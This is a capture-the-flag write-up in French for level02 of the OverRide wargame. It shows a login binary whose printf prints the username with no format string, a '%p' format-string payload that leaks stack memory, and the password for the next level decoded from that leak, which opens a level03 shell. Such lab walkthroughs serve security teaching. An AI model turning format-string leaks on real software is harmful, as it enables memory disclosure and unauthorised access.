# Level 02

On se retrouve encore une fois avec un petit programme de login apres avoir lu l'executable desassembler on peut voir que le programme stock dans un buffer le contenu du fichier `.pass` de `level03`

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin
--[ Password: admin      
*****************************************
admin does not have access!
```

Le seul endroit dans le code ayant un appel directe a la fonction `system` etant cette partie:

```c
if (strncmp(flag_buffer, password, 41)) {
	printf(user_name);
	puts(" does not have access!");
	exit(1);
}

printf("Greeting, %s!\n", user_name);
system("/bin/sh");
return 0;
```

Cependant on remarque rapidement une mauvaise utilisation de `printf` utilisant le buffer sans `format specifier` pour afficher un message d'erreur ce qui nous laisse une porte d'entree pour pouvoir leak des adresses de la stack

```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: BBBBBBBB
*****************************************
AAAAAAAA 0x7fffffffe500 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x4242424242424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x4141414141414141 0x2520702520702520 0x2070252070252070 does not have access!
```

On peut maintenant voir ou se trouve le buffer de l'username et du password apres avoir regarder de plus pres l'ordre d'allocation des buffers dans la stack et le resultat apres avoir leak les adresses

On deduit que les adresses se situant entre ces espaces memoire appartiennent au buffer du flag une fois convertit de sa valeur hex en ascii grace a notre [converteur](./artifacts/convert.py)


```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: hjjhjhjhjhhjhjh
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, hjjhjhjhjhhjhjh!
$ whoami
level03
$
```